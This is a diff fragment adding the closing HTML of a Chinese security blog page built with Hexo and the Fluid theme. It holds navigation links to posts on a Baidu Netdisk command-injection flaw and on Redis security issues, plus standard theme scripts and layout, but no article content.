+                      <a href="/2025/09/05/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%987.59%20Windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="百度网盘7.59 Windows客户端命令注入漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">百度网盘7.59 Windows客户端命令注入漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/04/redis%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="redis系列安全问题整理">
+                        <span class="hidden-mobile">redis系列安全问题整理</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
